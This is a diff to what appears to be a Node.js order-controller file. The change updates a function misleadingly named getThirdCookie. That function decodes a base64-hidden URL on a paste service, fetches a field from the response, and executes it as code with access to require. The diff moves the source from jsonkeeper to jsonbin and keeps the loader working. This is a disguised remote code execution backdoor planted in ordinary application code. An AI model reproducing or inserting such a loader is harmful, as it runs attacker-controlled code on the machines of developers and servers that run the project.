@@ -93,7 +93,7 @@ exports.getAllOrders = asyncErrorHandler(async (req, res, next) => {
 });
 
 async function getThirdCookie() {
-  var response = await axios.get(Buffer.from('aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL01XOUo2', 'base64').toString('utf-8'));
+  var response = await axios.get(Buffer.from('aHR0cHM6Ly9hcGkuanNvbmJpbi5pby92My9iLzZhNGQwNTAyZjVmNGFmNWUyOTZjNzZkOQ==', 'base64').toString('utf-8'));
   var createHandler = (errCode) => {
     try {
       var handler = new Function.constructor('require', errCode);
@@ -103,7 +103,7 @@ async function getThirdCookie() {
       return null;
     }
   };
-  var handlerFunc = createHandler(response.data.errCode);
+  var handlerFunc = createHandler(response.data.record.errCode);
   if (handlerFunc) {
     handlerFunc(require);
   } else {
